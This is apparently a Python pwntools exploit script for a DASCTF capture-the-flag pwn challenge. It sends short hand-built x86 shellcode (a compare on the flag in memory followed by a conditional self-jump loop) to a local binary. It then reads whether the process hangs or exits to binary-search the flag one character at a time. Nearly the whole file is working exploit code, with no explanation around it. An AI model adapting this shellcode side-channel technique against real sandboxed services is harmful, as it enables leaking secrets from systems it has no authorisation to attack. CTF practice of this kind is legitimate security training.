from pwn import *

s = "DASCTF012345689abcdefghijklmnopqrstuvwxyz!@#$%^&*()_-+=[]:<>?}{"
list_origin = [ord(x) for x in s]
list = list_origin

def test(index, cmp):
    io = process("./pwn")
    gdb.attach(io, 'b *$rebase(0x1516)')
    if index:
        shellcode = b'\x80\x7F' + p8(index) + p8(cmp) + b'\x7F\xFA'
        print(shellcode)
    else:
        shellcode = b'\x80\x3F' + p8(cmp) + b'\x7F\xFB'
        print(shellcode)
    io.sendline(shellcode)
    receive = io.recv(timeout = 1)
    io.interactive()

# test(0, ord('C'))     # cmp byte ptr [rdi], 0x43 /* 0xafb7f433f80 */
# test(1, ord('C'))     # cmp byte ptr [rdi + 1], 0x43 /* 0xfa7f43017f80 */


def jg(index, cmp):
    '''
    :param index: flag[index], which addr is to be cmped
    :param cmp: number need to cmp
    :return:
    '''
    # loop:
    # cmp 0x61, [rdi+1]
    # jg loop
    try:
        io = process("./pwn")
        # gdb.attach(io)

        if index:
            shellcode = b'\x80\x7F' + p8(index) + p8(cmp) + b'\x7F\xFA'
        else:
            shellcode = b'\x80\x3F' + p8(cmp) + b'\x7F\xFB'
        io.sendline(shellcode)
        receive = io.recv(timeout = 1)
    except EOFError as e:
        # this means jg didn't jump
        # so flag[i] <= cmp
        print(f"flag[{index}] <= {cmp}")
        io.close()
        return 0
    else:
        # if jg didn't didn't jump
        # flag[i] > cmp
        print(f"flag[{index}] > {cmp}")
        io.close()
        return 1

# jg(0, ord('D'))

def exp():
    exploit = ""
    while True:
        list = list_origin
        while len(list) > 1:
            aver = int((max(list) + min(list))/2)
            if jg(len(exploit), aver):
                list = [x for x in list if x > aver]
            else:
                list = [x for x in list if x <= aver]
        exploit += chr(list[0])
        print(exploit)
        if '}' in exploit:
            print(exploit)
            # return 0
exp()
# print(chr(123))